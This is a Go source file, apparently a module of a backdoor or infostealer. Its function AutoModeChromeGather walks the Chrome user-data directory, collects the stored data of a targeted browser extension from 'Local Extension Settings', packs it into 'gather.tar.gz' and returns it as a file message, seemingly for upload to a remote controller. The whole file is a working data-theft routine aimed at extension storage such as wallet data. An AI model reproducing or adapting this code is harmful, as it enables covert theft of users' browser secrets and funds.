package auto

import (
	"bytes"
	"fix-project/mods/config"
	"fix-project/mods/util"
	"os"
	"path/filepath"
	"runtime"
	"strings"
)

func AutoModeChromeGather() (string, [][]byte) {
	print("===========	AutoModeChromeGather =========== OS:", runtime.GOOS, "\n")

	var (
		buf          bytes.Buffer
		userdata_dir string
		path_list    []string
	)

	// gather
	userdata_dir = getUserdataDir()

	// file system search
	// Comment
	_ = filepath.Walk(userdata_dir, func(path string, info os.FileInfo, err error) error {
		if info.Name() == extension_dir && strings.Contains(path, "Local Extension Settings") {
			path_list = append(path_list, path)
		}
		return nil
	})

	_ = util.Compress(&buf, path_list, true)

	print("===========	End ===========\n")

	// return
	data := make([][]byte, 3)
	data[0] = []byte(config.LOG_SUCCESS)
	data[1] = []byte("gather.tar.gz")
	data[2] = buf.Bytes()
	msg_type := config.MSG_FILE

	return msg_type, data
}
